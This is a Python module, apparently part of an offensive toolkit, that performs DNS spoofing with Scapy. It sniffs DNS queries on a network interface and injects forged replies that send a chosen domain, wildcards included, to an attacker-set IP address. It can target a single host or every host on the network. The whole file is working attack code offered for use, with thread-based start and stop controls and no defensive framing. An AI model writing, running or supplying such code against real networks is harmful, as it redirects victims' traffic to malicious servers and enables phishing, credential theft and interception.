"""
dns_spoof.py — DNS Spoofing via Scapy packet injection.

Intercepts DNS queries (UDP port 53) and replies with a forged
answer pointing the requested domain to spoof_ip.

Modes:
  target_ip = None  → spoof for all hosts on the network
  target_ip = "x.x.x.x" → spoof only for that specific host
"""

import threading
import time
import logging
import re

log = logging.getLogger("offensive.dns_spoof")

_stop_event = threading.Event()
_thread     = None
_config     = {}

try:
    from scapy.all import (sniff, DNS, DNSQR, DNSRR, IP, UDP,
                           Ether, send, sendp)
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False


def _matches_domain(queried: str, pattern: str) -> bool:
    """Support wildcard: *.example.com matches sub.example.com"""
    queried = queried.rstrip(".").lower()
    pattern = pattern.lower()
    if pattern.startswith("*."):
        return queried.endswith(pattern[1:])
    return queried == pattern


def _handle_packet(pkt):
    cfg = _config
    if not pkt.haslayer(DNS):
        return
    if pkt[DNS].qr != 0:     # Only handle queries (qr=0)
        return

    src_ip = pkt[IP].src if pkt.haslayer(IP) else None

    # Target filter
    if cfg.get("target_ip") and src_ip != cfg["target_ip"]:
        return

    qname = pkt[DNSQR].qname.decode(errors="replace")

    if not _matches_domain(qname, cfg["domain"]):
        return

    log.info(f"[DNS] Spoofing {qname} → {cfg['spoof_ip']} for {src_ip}")

    spoofed = (
        IP(dst=pkt[IP].src, src=pkt[IP].dst) /
        UDP(dport=pkt[UDP].sport, sport=53) /
        DNS(
            id=pkt[DNS].id,
            qr=1, aa=1, qd=pkt[DNS].qd,
            an=DNSRR(rrname=qname, ttl=10, rdata=cfg["spoof_ip"])
        )
    )
    send(spoofed, verbose=False)


def _run(target_ip, domain, spoof_ip, iface):
    _config.update({
        "target_ip": target_ip,
        "domain":    domain,
        "spoof_ip":  spoof_ip,
    })
    log.info(f"[DNS] Spoofing {domain} → {spoof_ip} "
             f"target={'all' if not target_ip else target_ip}")

    bpf = "udp port 53"
    sniff(
        iface=iface,
        filter=bpf,
        prn=_handle_packet,
        store=False,
        stop_filter=lambda _: _stop_event.is_set(),
    )
    log.info("[DNS] Stopped.")


def start(target_ip: str | None, domain: str, spoof_ip: str,
          iface: str = "eth0"):
    global _thread
    if not SCAPY_OK:
        log.error("Scapy not available.")
        return
    if _thread and _thread.is_alive():
        stop()
        time.sleep(1)
    _stop_event.clear()
    _thread = threading.Thread(
        target=_run, args=(target_ip, domain, spoof_ip, iface),
        name="dns_spoof", daemon=True)
    _thread.start()


def stop():
    _stop_event.set()


def is_running() -> bool:
    return bool(_thread and _thread.is_alive() and not _stop_event.is_set())
